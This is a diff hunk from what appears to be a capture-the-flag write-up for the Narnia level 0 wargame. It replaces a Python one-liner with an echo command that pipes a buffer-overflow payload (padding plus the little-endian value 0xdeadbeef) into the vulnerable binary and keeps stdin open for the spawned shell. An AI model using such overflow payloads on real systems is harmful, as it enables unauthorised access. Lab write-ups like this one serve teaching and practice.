@@ -122,7 +122,7 @@ Initial attempts incorrectly mixed Python and Bash syntax when generating the pa
 Final payload:
 
 ```bash
-(python -c 'print "A"*20+"\xef\xbe\xad\xde"'; cat) | ./narnia0
+(echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'; cat) | ./narnia0
 ```
 
 The payload consists of:
